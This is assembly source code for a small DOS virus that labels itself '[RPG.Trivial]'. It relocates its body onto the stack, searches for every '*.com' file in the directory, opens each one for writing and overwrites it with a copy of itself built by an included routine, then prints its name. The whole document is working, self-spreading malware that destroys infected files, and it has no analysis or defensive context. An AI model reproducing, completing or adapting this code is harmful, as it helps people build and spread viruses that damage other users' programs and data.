.model tiny
.386
.code
.startup
org 100h

z       equ     si-113h
vs      equ     e-s
vs2     equ     (vs+1)/2
m:
        std
        lea     si,e-2
        mov     cx,vs
        shr     cx,1            ; cx / 2
        jnc     mloop
        inc     cx
        inc     si
mloop:
        lodsw
        push    ax
        loop    mloop
        jmp     sp
s:
        mov     si,sp
        lea     dx,[z+msk]
        mov     ah,4Eh
        mov     cx,20h
        int     21h
        jc      er
        jmp     infect
findnext:
        mov     ah,4Fh
        mov     dx,80h
        int     21h
        jc      er

infect: mov     ax,3d02h
        mov     dx,9Eh
        int     21h
        jc      er
        xchg    ax,bx
        mov     di,100h
        mov     cx,vs
        push    si di
        add     si,vs-2
        call    RPG                     ; cx = lenght
        pop     dx si
        mov     ah,40h
        int     21h
        mov     ah,3Eh
        int     21h
        jmp     findnext

er:     mov     cx,vs2*2
        add     sp,cx
        mov     ah,9
        lea     dx,[z+msg]
        int     21h
        ret
msg     db      '[RPG.Trivial]',13,10,'$'
msk     db      '*.com',0
include rpg.inc
e:
end
